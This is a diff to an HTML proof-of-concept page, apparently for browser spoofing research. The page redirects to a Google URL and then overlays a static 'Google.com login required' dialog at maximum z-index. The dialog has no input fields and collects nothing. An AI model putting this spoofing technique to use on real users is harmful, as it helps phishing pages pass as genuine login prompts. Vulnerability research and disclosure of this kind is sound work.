@@ -1,16 +1,62 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    .poC-overlay {
+      position: fixed;
+      left: 50%;
+      top: 40%;
+      transform: translate(-50%, -50%);
+      min-width: 280px;
+      max-width: 90%;
+      padding: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+      border-radius: 10px;
+      background: #fff;
+      font-family: Arial, sans-serif;
+      z-index: 2147483647; /* sangat tinggi agar muncul di atas */
+    }
+    .poC-title { font-weight: 600; margin-bottom: 8px; }
+    .poC-text { margin-bottom: 12px; color:#333; }
+    .poC-actions { text-align: right; }
+    .poC-btn {
+      padding: 6px 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      background: #f2f2f2;
+      cursor: pointer;
+      margin-left: 8px;
+    }
+  </style>
+</head>
 <body>
-  <h2>PoC 3: iframe warmup + redirect + text</h2>
-  <iframe src="https://www.google.com:1234" style="display:none;"></iframe>
+  <h2>PoC 3: iframe warmup + redirect + static text overlay</h2>
+  <iframe src="https://www.google.com/csi" style="display:none;"></iframe>
+
   <script>
+    function showStaticDialog() {
+      // Jika sudah ada, jangan buat lagi
+      if (document.getElementById('poc-overlay')) return;
+
+      const overlay = document.createElement('div');
+      overlay.id = 'poc-overlay';
+      overlay.className = 'poC-overlay';
+      overlay.innerHTML = `
+        <div class="poC-title">Google.com login required</div>
+        <div class="poC-text">Email / Password</div>
+        <div class="poC-actions">
+          <button class="poC-btn" onclick="document.getElementById('poc-overlay')?.remove()">Cancel</button>
+          <button class="poC-btn" onclick="document.getElementById('poc-overlay')?.remove()">OK</button>
+        </div>
+      `;
+      document.body.appendChild(overlay);
+    }
+
     setTimeout(() => {
-      top.location = "https://www.google.com:1234";
+      top.location = "https://www.google.com/csi";
       setTimeout(() => {
-        // Ganti prompt dengan menambahkan teks biasa ke halaman
-        const p = document.createElement('p');
-        p.textContent = "Google.com login required — Email / Password";
-        document.body.appendChild(p);
+        showStaticDialog();
       }, 800);
     }, 1000);
   </script>
